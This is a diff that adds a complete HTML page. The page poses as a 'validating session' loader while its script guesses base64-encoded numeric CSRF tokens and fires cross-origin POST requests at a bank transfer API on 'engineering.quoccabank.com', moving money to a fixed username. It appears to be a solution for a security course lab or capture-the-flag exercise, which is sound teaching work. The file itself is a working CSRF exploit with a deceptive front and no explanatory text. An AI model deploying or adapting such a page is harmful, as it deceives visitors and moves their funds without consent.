@@ -1,0 +1,35 @@
+<html>
+
+<head>
+    <title>Loading...</title>
+</head>
+
+<body>
+    <script>
+        async function exploit() {
+            const target = "https://engineering.quoccabank.com/api/transfer";
+
+            for (let i = 8619; i < 9999; i++) {
+                let token = btoa(i.toString());
+
+                let body = new URLSearchParams();
+                body.append('csrf_token', token);
+                body.append('username', 'z5631971');
+                body.append('amount', '1');
+
+                fetch(target, {
+                    method: 'POST',
+                    body: body,
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    }
+                });
+            }
+        }
+        exploit();
+    </script>
+    <h1>Please wait, validating session...</h1>
+</body>
+
+</html>
